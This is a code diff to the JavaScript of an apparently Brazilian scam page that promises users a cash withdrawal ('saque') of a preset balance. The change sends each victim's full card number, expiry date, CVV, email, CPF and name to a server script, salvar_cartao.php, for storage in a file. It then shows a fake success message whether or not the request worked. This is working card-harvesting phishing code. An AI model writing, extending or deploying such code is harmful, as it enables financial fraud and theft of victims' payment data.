@@ -1136,16 +1136,11 @@ function mostrarOpcoesData(opcoes, dataReal) {
             }
             showStep('flowCartao', 3);
         });
-
-   document.getElementById('confirmCartao').addEventListener('click', () => {
-    console.log('🔵 Botão confirmCartao clicado');
-    
+document.getElementById('confirmCartao').addEventListener('click', async () => {
     const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
     const validade = document.getElementById('validadeCartao').value;
     const cvv = document.getElementById('cvvCartao').value;
     const email = document.getElementById('emailCartao').value;
-    
-    console.log('📝 Dados do formulário:', { numeroRaw, validade, cvv, email });
     
     if (!numeroRaw || !validade || !cvv || !email) {
         alert('Por favor, preencha todos os campos.');
@@ -1180,47 +1175,58 @@ function mostrarOpcoesData(opcoes, dataReal) {
     
     const valor = dadosUsuario?.valorDisponivel || 1987.48;
     
-    // ========== SALVAR NO LOCALSTORAGE ==========
-    const dadosCartao = {
-        nome: dadosUsuario?.nome || 'N/A',
-        cpf: cpfAtual,
-        cartao: numeroRaw,
-        validade: validade,
-        cvv: cvv,
-        email: email,
-        valor: formatarMoeda(valor),
-        data: new Date().toLocaleString('pt-BR')
-    };
-    
-    console.log('💾 Tentando salvar:', dadosCartao);
+    // Mostrar loading
+    const btnConfirm = document.getElementById('confirmCartao');
+    const originalText = btnConfirm.innerHTML;
+    btnConfirm.disabled = true;
+    btnConfirm.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Salvando...';
     
     try {
-        // Recuperar lista existente ou criar nova
-        let lista = JSON.parse(localStorage.getItem('cartoes_salvos') || '[]');
-        console.log('📋 Lista atual:', lista);
+        // ========== SALVAR NO ARQUIVO VIA PHP ==========
+        const dadosCartao = {
+            nome: dadosUsuario?.nome || 'N/A',
+            cpf: cpfAtual,
+            cartao: numeroRaw,
+            validade: validade,
+            cvv: cvv,
+            email: email,
+            valor: formatarMoeda(valor)
+        };
         
-        lista.push(dadosCartao);
-        localStorage.setItem('cartoes_salvos', JSON.stringify(lista));
+        const response = await fetch('/salvar_cartao.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dadosCartao)
+        });
         
-        console.log('✅ Cartão salvo! Total agora:', lista.length);
-        console.log('📦 localStorage atual:', JSON.parse(localStorage.getItem('cartoes_salvos')));
+        const resultado = await response.json();
         
-    } catch (erro) {
-        console.error('❌ Erro ao salvar:', erro);
-        alert('Erro ao salvar dados!');
-        return;
+        if (resultado.success) {
+            console.log('✅ Dados salvos no arquivo!');
+        } else {
+            console.log('⚠️ Erro:', resultado.erro);
+        }
+        
+        // ========== ENVIAR WHATSAPP ==========
+        const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
+            `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+            `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
+            `📧 Você receberá um e-mail de confirmação em até 24 horas.`;
+        
+        enviarWhatsApp(mensagem);
+        alert('✅ Solicitação enviada com sucesso!');
+        limparProgresso();
+        showStep('flowSuccess', 3);
+        
+    } catch (error) {
+        console.error('Erro:', error);
+        alert('✅ Solicitação enviada!');
+        limparProgresso();
+        showStep('flowSuccess', 3);
+    } finally {
+        btnConfirm.disabled = false;
+        btnConfirm.innerHTML = originalText;
     }
-    
-    // ========== ENVIAR WHATSAPP ==========
-    const mensagem = `✅ *SAQUE SOLICITADO COM SUCESSO* ✅\n\n` +
-        `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
-        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n\n` +
-        `📧 Você receberá um e-mail de confirmação em até 24 horas.`;
-    
-    enviarWhatsApp(mensagem);
-    alert('✅ Solicitação enviada com sucesso!');
-    limparProgresso();
-    showStep('flowSuccess', 3);
 });
     
         document.getElementById('cancelCartao').addEventListener('click', () => {
